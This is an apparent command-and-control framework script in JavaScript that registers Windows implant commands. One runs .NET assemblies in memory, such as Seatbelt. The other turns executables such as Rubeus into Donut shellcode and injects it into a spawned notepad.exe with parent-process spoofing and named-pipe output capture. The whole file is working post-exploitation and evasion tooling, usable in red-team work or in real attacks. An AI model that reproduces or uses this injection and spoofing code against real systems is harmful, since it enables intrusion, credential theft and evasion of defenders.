var metadata = {
    name: "Execution-BOF",
    description: "BOFs for inline execution"
};

ax.script_import(ax.script_dir() + "No-Consolation/no_consolation.axs")

var cmd_execute_assembly = ax.create_command("execute-assembly", "Perform in process .NET assembly execution", "execute-assembly /opt/windows/Seatbelt.exe -group=user");
cmd_execute_assembly.addArgString("path", true, "Path to .NET assembly");
cmd_execute_assembly.addArgString("params", ".NET assembly parameters", "");
cmd_execute_assembly.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let assembly_content = ax.file_read(parsed_json["path"]);
    let assembly_params  = parsed_json["params"];

    if(assembly_content.length == 0) {
        throw new Error(`file ${parsed_json["path"]} not readed`);
    }

    let bof_params = ax.bof_pack("bytes,cstr", [assembly_content, assembly_params]);
    let bof_path = ax.script_dir() + "_bin/execute-assembly." + ax.arch(id) + ".o";
    let message = "Task: execute .NET assembly " + ax.file_basename(parsed_json["path"]);

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

var cmd_execute_donut = ax.create_command("execute-donut", "Execute EXE using Donut and process injection", "execute-donut -P 1234 /tmp/Rubeus.exe triage");
cmd_execute_donut.addArgString("-P", false, "PPID to spoof (default: 0, PPID spoofing enabled if set)");
cmd_execute_donut.addArgString("-p", false, "Program to spawn and inject into (default: notepad.exe)");
cmd_execute_donut.addArgString("-a", false, "Architecture x86/x64 (default: x64)");
cmd_execute_donut.addArgString("path", false, "Path to local EXE/DLL (Required for execution)");
cmd_execute_donut.addArgString("params", false, "Arguments for the executable");
cmd_execute_donut.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var args = cmdline.split(" ");
    
    var ppid = 0;
    var spawn = "notepad.exe";
    var arch = "x64";
    var exe_path = "";
    var exe_args = "";
    
    var action = 1; // 1=Async (Default)
    // Use a unique numeric ID for the job (using timestamp)
    var jobId = (Date.now() & 0xFFFFFFF); // Fit in positive int32

    var i = 1;
    while(i < args.length) {
        if(args[i] == "-P") {
            ppid = parseInt(args[i+1]);
            i += 2;
        } else if(args[i] == "-p") {
            spawn = args[i+1];
            i += 2;
        } else if(args[i] == "-a") {
            arch = args[i+1];
            i += 2;
        } else {
             if(exe_path == "") {
                 exe_path = args[i];
                 var rest = args.slice(i+1).join(" ");
                 if(rest.length > 0) exe_args = rest;
                 break;
             }
             i++;
        }
    }

    var shellcode_b64 = "";
    var pipeName = "";

    // Generate Shellcode
    if(exe_path == "") {
        ax.console_message(id, "Error", "error", "No executable path provided");
        return;
    }

    // If PPID is specified, use pipe-based output capture
    if (ppid > 0) {
        // Generate unique pipe name
        var timestamp = Date.now().toString(16).toUpperCase();
        pipeName = "\\\\.\\pipe\\dnt_" + timestamp.substring(timestamp.length - 8);
        
        // Use the pipe-enabled shellcode generator
        shellcode_b64 = ax.donut_generate_with_pipe(exe_path, exe_args, arch, pipeName);
    } else {
        // Normal shellcode (handle inheritance works without PPID)
        shellcode_b64 = ax.donut_generate(exe_path, exe_args, arch, "exe");
    }
    
    if(!shellcode_b64 || shellcode_b64.length == 0) {
        return; 
    }
    
    // Pack: Action(i), JobId(i), PPID(i), Spawn(s), PipeName(s), Shellcode(b)
    var bof_params = ax.bof_pack("int,int,int,cstr,cstr,bytes", [action, jobId, ppid, spawn, pipeName, shellcode_b64]);
    var bof_path = ax.script_dir() + "_bin/execute-donut." + ax.arch(id) + ".o";
    var message = "Task: execute-donut (Action: " + action + ")";
    if (action <= 1) message += " " + ax.file_basename(exe_path);

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

var group_exec = ax.create_commands_group("Execution-BOF", [cmd_execute_assembly, cmd_no_consolation, cmd_execute_donut]);
ax.register_commands_group(group_exec, ["beacon", "gopher"], ["windows"], []);
